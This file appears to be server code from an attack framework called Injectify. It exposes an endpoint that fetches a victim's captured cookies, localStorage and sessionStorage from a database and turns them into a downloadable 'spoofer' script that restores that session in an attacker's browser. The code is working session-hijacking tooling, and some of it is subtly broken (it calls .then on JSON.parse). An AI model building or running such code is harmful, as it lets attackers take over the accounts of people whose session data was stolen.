"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
const chalk_1 = require("chalk");
const request_1 = require("request");
const github = require('octonode');
class default_1 {
    constructor(db) {
        this.db = db;
    }
    query(project, index) {
        return new Promise((resolve, reject) => {
            resolve({
                test: 1
            });
        });
    }
}
exports.default = default_1;
function getAPI(db, name, index, token) {
    return new Promise((resolve, reject) => {
        const client = github.client(token);
        client.get('/user', (error, status, body) => {
            console.log(error, status, body);
        });
        request_1.default({
            url: 'https://api.github.com/user?access_token=' + encodeURIComponent(token),
            method: 'GET',
            headers: {
                'Accept': 'application/json',
                'User-Agent': 'Injectify'
            }
        }, (error, response, data) => {
            JSON.parse(data).then((user) => {
                if (response.statusCode === 200 && user.login) {
                    db.collection('projects', (err, projects) => {
                        if (err)
                            throw err;
                        projects.findOne({
                            $or: [{
                                    'permissions.owners': user.id
                                },
                                {
                                    'permissions.admins': user.id
                                },
                                {
                                    'permissions.readonly': user.id
                                }
                            ],
                            $and: [{
                                    'name': name
                                }]
                        }).then(doc => {
                            if (doc !== null) {
                                let record = doc.passwords[index];
                                if (record) {
                                    if (record.storage) {
                                        let local = record.storage.local;
                                        let session = record.storage.session;
                                        let cookies = record.storage.cookies;
                                        let js = '';
                                        let property;
                                        if (local) {
                                            for (property in local) {
                                                if (local.hasOwnProperty(property)) {
                                                    js +=
                                                        `localStorage.setItem('` + property.replace(/\\/g, '\\\\').replace(/'/g, "\\'") + `', '` + local[property].replace(/\\/g, '\\\\').replace(/'/g, "\\'") + `');\n`;
                                                }
                                            }
                                        }
                                        if (session) {
                                            for (property in session) {
                                                if (session.hasOwnProperty(property)) {
                                                    js +=
                                                        `sessionStorage.setItem('` + property.replace(/\\/g, '\\\\').replace(/'/g, "\\'") + `', '` + session[property].replace(/\\/g, '\\\\').replace(/'/g, "\\'") + `');\n`;
                                                }
                                            }
                                        }
                                        if (cookies) {
                                            for (property in cookies) {
                                                if (cookies.hasOwnProperty(property)) {
                                                    js +=
                                                        `document.cookie = '` + property.replace(/\\/g, '\\\\').replace(/'/g, "\\'") + `=` + cookies[property].replace(/\\/g, '\\\\').replace(/'/g, "\\'") + `';\n`;
                                                }
                                            }
                                        }
                                        // let minified = UglifyJS.minify(js).code
                                        // if (minified) js = minified
                                        if (js) {
                                            resolve({
                                                js: js,
                                                project: doc.name,
                                                user: user
                                            });
                                        }
                                        else {
                                            reject({
                                                title: 'Nothing to generate',
                                                message: "The requested record didn't contain any storage"
                                            });
                                        }
                                    }
                                    else {
                                        reject({
                                            title: 'Database error',
                                            message: 'An internal error occured whilst handling your request'
                                        });
                                    }
                                }
                                else {
                                    reject({
                                        title: 'Nonexistent index',
                                        message: 'The index ' + index + " doesn't exist for this project"
                                    });
                                }
                            }
                            else {
                                reject({
                                    title: 'Access denied',
                                    message: "You don't have permission to access project " + name
                                });
                            }
                        });
                    });
                }
                else {
                    reject({
                        title: 'Could not authenticate you',
                        message: 'GitHub API rejected token!'
                    });
                }
            }).catch((error) => {
                console.error(error, data);
                reject({
                    title: 'Could not authenticate you',
                    message: 'Failed to parse the GitHub user API response'
                });
            });
        });
    });
}
function api(req, res, db) {
    let token = req.query.token;
    let index = req.query.index;
    let project = decodeURIComponent(req.path.substring(11));
    if (project && token && index) {
        getAPI(db, project, index, token).then(data => {
            let js = data.js;
            let project = data.project;
            let user = data.user;
            res.setHeader('Content-Disposition', 'filename="Injectify spoofer [' + project + '].js"');
            if (typeof req.query.download === 'string') {
                res.setHeader('Content-Type', 'application/octet-stream');
            }
            else {
                res.setHeader('Content-Type', 'application/javascript');
            }
            res.send(js);
            console.log(chalk_1.default.greenBright('[API/SPOOF] ') +
                chalk_1.default.yellowBright('delivered ') +
                chalk_1.default.magentaBright(project) +
                chalk_1.default.redBright(' (length=' + js.length + ') ') +
                chalk_1.default.yellowBright('to ') +
                chalk_1.default.magentaBright(user.login) +
                chalk_1.default.redBright(' (' + user.id + ') '));
        }).catch(error => {
            res.status(403).setHeader('Content-Type', 'application/json');
            res.send(JSON.stringify(error, null, '    '));
        });
    }
    else {
        res.setHeader('Content-Type', 'application/json');
        res.status(400).send(JSON.stringify({
            title: 'Bad request',
            message: 'Specify a token, project name and index to return in request',
            format: '/api/spoof/PROJECT_NAME?index=INDEX&token=GITHUB_TOKEN'
        }, null, '    '));
    }
}
